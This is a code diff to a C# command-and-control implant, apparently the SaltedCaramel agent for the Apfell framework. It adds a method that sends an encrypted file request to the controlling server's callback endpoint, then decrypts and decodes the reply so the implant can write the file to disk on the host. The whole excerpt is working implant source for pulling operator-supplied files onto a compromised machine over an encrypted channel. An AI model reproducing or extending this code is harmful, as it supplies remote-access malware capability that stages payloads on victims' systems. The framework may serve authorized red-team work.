@@ -4,11 +4,33 @@ using System;
 using System.Diagnostics;
 using System.IO;
 
+/// <summary>
+/// This task will upload a specified file from the Apfell server to the implant at the given file path
+/// </summary>
 namespace SaltedCaramel.Tasks
 {
     internal class Upload
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static byte[] GetFile(string file_id, SCImplant implant)
+        {
+            byte[] bytes;
+            string fileEndpoint = implant.endpoint + "files/callback/" + implant.callbackId;
+            try
+            {
+                string payload = "{\"file_id\": \"" + file_id + "\"}";
+                // Encrypt json to send to server
+                string encrypted = implant.crypto.Encrypt(payload);
+                // Get response from server and decrypt
+                string result = implant.crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
+                bytes = Convert.FromBase64String(result);
+                return bytes;
+            }
+            catch
+            {
+                return null;
+            }
+        }
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
             string file_id = json.Value<string>("file_id");
